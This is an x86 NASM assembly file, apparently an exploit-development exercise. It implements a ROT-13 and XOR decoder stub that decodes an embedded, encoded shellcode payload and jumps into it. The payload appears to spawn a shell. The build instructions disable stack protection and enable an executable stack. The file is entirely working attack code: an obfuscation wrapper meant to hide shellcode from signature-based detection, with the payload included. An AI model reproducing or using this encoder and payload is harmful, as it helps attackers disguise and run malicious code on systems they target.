;Program:	ROT-13 XOR Decoder
;Author:	Bhanu Teja
;
;Compilation 	# nasm -f elf32 rot13_XOR_decoder.nasm 
;		# ld rot13_XOR_decoder.o -o rot13_XOR_decoder -fno-stack-protector -shared -z execstack
;---start---;

global _start

section .text
_start:

	jmp short push_shellcode	; jumps to push_shellcode method

store_shellcode:
	pop esi				; store shellcode into esi
decode:
	cmp byte[esi], 0xAA		; compare current esi byte is 0xAA or not
	jz shellcode			; if the comparision is true then jump to shellcode
	xor byte[esi], 0xAA		; de-xoring the esi byte with 0xAA 
	sub byte[esi], 13		; rot-13 decode byte at [esi]
	inc esi				; increment esi
	jmp short decode		; jump to decode and repeat the same again	

push_shellcode:
	call store_shellcode		; call store_shellcode function and pushed the shellcode onto the stack
	shellcode: db 0x94, 0x67, 0xf7, 0x3c, 0x45, 0xdf, 0x96, 0x96, 0x2a, 0xdf, 0xdf, 0x96, 0xc5, 0xdc, 0xd1, 0x3c, 0x5a, 0xf7, 0x17, 0xb2, 0x70, 0x27, 0xAA
